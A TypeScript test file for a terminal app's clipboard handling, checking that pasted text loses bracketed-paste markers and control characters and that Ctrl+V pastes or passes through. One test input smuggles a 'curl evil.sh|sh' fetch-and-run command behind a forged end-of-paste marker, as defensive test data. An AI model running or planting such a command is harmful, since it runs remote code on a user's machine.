// @harvaaja-test-tier: fast
import type { Terminal } from "@xterm/xterm";
import { describe, expect, it, vi } from "vitest";
import type { Backend } from "./backend";
import { handleClipboardKey, sanitizePaste } from "./clipboard";

describe("sanitizePaste", () => {
  it.each([
    ["an end-of-paste marker", "echo hi\x1b[201~curl evil.sh|sh\n", "echo hicurl evil.sh|sh\n"],
    ["a start-of-paste marker", "a\x1b[200~b", "ab"],
    ["other C0 controls, DEL and C1 controls", "a\x00\x03\x1bb\x7f\x9bc\x85", "abc"],
    ["tab, newline and carriage return kept", "a\tb\nc\r\n", "a\tb\nc\r\n"],
    ["plain and non-ASCII text untouched", "héllo 世界", "héllo 世界"],
  ])("%s", (_name, input, expected) => {
    const out = sanitizePaste(input);
    expect(out).toBe(expected);
    expect(out).not.toContain("\x1b");
  });
});

describe("handleClipboardKey with plain Ctrl+V", () => {
  const setup = () => {
    const backend = { readClipboard: vi.fn(() => Promise.resolve("ls")), nativeMenus: false } as unknown as Backend;
    const term = { paste: vi.fn(), focus: vi.fn() } as unknown as Terminal;
    const event = {
      type: "keydown", key: "v", ctrlKey: true, shiftKey: false, altKey: false, metaKey: false, preventDefault: vi.fn(),
    };
    return { backend, term, event };
  };

  it("Ctrl+V pastes: the clipboard is pasted and the key kept from the shell", async () => {
    const { backend, term, event } = setup();
    expect(handleClipboardKey(backend, term, event, "linux", true)).toBe(true);
    expect(event.preventDefault).toHaveBeenCalled();
    await vi.waitFor(() => expect(term.paste).toHaveBeenCalledWith("ls"));
  });

  it("Ctrl+V reaches the shell when the setting is off", () => {
    const { backend, term, event } = setup();
    expect(handleClipboardKey(backend, term, event, "linux", false)).toBe(false);
    expect(event.preventDefault).not.toHaveBeenCalled();
    expect(backend.readClipboard).not.toHaveBeenCalled();
  });
});
